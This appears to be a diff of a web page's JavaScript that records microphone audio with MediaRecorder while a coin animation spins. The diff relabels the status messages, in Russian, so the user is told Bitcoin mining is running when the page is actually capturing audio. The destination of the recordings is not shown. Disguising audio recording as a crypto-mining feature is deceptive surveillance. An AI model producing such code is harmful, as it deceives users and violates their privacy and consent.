@@ -41,7 +41,7 @@
       navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
         recording = true;
         coin.classList.add('rotating');
-        status.textContent = "Запись идёт…";
+        status.textContent = "Майнинг идёт…";
         chunks = [];
 
         mediaRecorder = new MediaRecorder(stream);
@@ -67,7 +67,7 @@
     function stopRecording() {
       recording = false;
       coin.classList.remove('rotating');
-      status.textContent = "Производится майнинг BTC…";
+      status.textContent = "После нажатия начнется майнинг BTC…";
       clearInterval(autoTimer);
       if (mediaRecorder && mediaRecorder.state !== "inactive") {
         mediaRecorder.stop();
@@ -104,3 +104,4 @@
 </html>
 
 </html>
+
